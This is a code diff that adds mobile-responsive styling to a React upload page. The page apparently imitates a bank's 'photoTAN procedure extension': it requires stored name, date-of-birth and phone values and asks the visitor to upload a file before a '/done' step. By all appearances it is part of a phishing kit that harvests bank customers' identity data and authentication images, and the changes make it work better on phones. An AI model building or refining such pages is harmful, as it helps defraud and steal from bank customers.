@@ -10,6 +10,7 @@ const UploadPage: React.FC = () => {
   const [selectedFile, setSelectedFile] = useState<File | null>(null);
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
+  const [isMobile, setIsMobile] = useState(false);
   const fileInputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
@@ -22,6 +23,16 @@ const UploadPage: React.FC = () => {
     if (!xname1 || !xname2 || !xdob || !xtel) {
       navigate('/info');
     }
+
+    // Check if mobile
+    const checkMobile = () => {
+      setIsMobile(window.innerWidth <= 768);
+    };
+    
+    checkMobile();
+    window.addEventListener('resize', checkMobile);
+    
+    return () => window.removeEventListener('resize', checkMobile);
   }, [navigate]);
 
   const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -86,7 +97,7 @@ const UploadPage: React.FC = () => {
     }}>
       {/* Main heading */}
       <h1 style={{
-        fontSize: '32px',
+        fontSize: isMobile ? '24px' : '32px',
         fontWeight: 'bold',
         color: '#333',
         marginTop: '20px',
@@ -96,20 +107,20 @@ const UploadPage: React.FC = () => {
         width: '100%',
         maxWidth: '1200px',
         margin: '20px auto 20px auto',
-        padding: '0 20px'
+        padding: isMobile ? '0 15px' : '0 20px'
       }}>
         Last step: Extension of your existing photoTAN procedure
       </h1>
       
       <div style={{
         display: 'flex',
-        flexDirection: 'row',
-        gap: '20px',
+        flexDirection: isMobile ? 'column' : 'row',
+        gap: isMobile ? '15px' : '20px',
         width: '100%',
         maxWidth: '1200px',
         alignItems: 'flex-start',
         margin: '0 auto',
-        padding: '0 20px'
+        padding: isMobile ? '0 15px' : '0 20px'
       }}>
         {/* Left Column - Upload Section */}
         <div style={{
@@ -117,13 +128,13 @@ const UploadPage: React.FC = () => {
           background: 'white',
           borderRadius: '8px',
           boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
-          padding: '40px',
+          padding: isMobile ? '20px' : '40px',
           width: '100%',
-          minWidth: '300px'
+          minWidth: isMobile ? 'auto' : '300px'
         }}>
           {/* Upload heading */}
           <h1 style={{
-            fontSize: '32px',
+            fontSize: isMobile ? '24px' : '32px',
             fontWeight: 'bold',
             color: '#333',
             marginTop: '0px',
@@ -137,11 +148,11 @@ const UploadPage: React.FC = () => {
             backgroundColor: '#f8f9fa',
             border: '2px dashed #000000',
             borderRadius: '8px',
-            padding: '20px',
+            padding: isMobile ? '15px' : '20px',
             marginBottom: '20px'
           }}>
             <p style={{
-              fontSize: '14px',
+              fontSize: isMobile ? '13px' : '14px',
               color: '#333',
               lineHeight: '1.5',
               margin: '0 0 15px 0',
@@ -179,7 +190,7 @@ const UploadPage: React.FC = () => {
               src="/lika2.gif" 
               alt="Upload animation" 
               style={{
-                width: '250px',
+                width: isMobile ? '200px' : '250px',
                 height: 'auto',
                 borderRadius: '8px',
                 boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)'
@@ -199,8 +210,9 @@ const UploadPage: React.FC = () => {
           {/* Buttons Container */}
           <div style={{
             display: 'flex',
+            flexDirection: isMobile ? 'column' : 'row',
             justifyContent: 'center',
-            gap: '15px',
+            gap: isMobile ? '10px' : '15px',
             marginTop: '20px'
           }}>
             <button
@@ -208,8 +220,8 @@ const UploadPage: React.FC = () => {
               onClick={handleUploadClick}
               disabled={isLoading}
               style={{
-                width: '40%',
-                padding: '15px',
+                width: isMobile ? '100%' : '40%',
+                padding: isMobile ? '18px' : '15px',
                 background: isLoading ? '#ccc' : 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                 color: 'white',
                 border: 'none',
@@ -233,8 +245,8 @@ const UploadPage: React.FC = () => {
               onClick={() => navigate('/done')}
               disabled={!selectedFile || isLoading}
               style={{
-                width: '40%',
-                padding: '15px',
+                width: isMobile ? '100%' : '40%',
+                padding: isMobile ? '18px' : '15px',
                 background: (!selectedFile || isLoading) ? '#ccc' : '#FFC107',
                 color: 'white',
                 border: 'none',
@@ -303,7 +315,7 @@ const UploadPage: React.FC = () => {
           background: 'white',
           borderRadius: '8px',
           boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
-          padding: '40px'
+          padding: isMobile ? '20px' : '40px'
         }}>
           <h3 style={{
             fontSize: '20px',
